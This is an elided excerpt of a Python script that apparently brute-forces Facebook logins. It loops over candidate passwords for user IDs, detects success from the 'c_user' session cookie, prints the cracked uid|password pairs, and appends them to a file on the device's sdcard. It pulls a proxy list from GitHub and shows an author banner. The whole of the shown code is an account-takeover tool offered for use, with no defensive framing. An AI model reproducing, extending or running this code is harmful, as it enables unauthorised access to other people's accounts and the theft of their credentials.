...
def __init__(self):
        ...
        self.loop = 0
try:
 prox= requests.get('https://github.com/Shamim1BD/BD10/blob/main/Afroveal10.txt').text
...
\033[1;32m   [+]===============================================[+]
\033[1;94m   [+]        CREATED BY   :  SHAMIM SARKAR             \033[1;94m
\033[1;33m   [+]        ON GITHUB    :  Shamim1BD               \033[1;94m
...
def sexy():
    ...
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [😁] OK SHAMIM-OK.txt')
    print(' [😁] CP SHAMIM-OK.txt')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def alhaj(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[SHAMIM-KING]\033[1;36m😍[%s/%s]😁\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32mSHAMIM-LOL-CP\033[1;33m]\033[1;91m {uid}|{ps}")
                open('/sdcard/SHAMIM-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
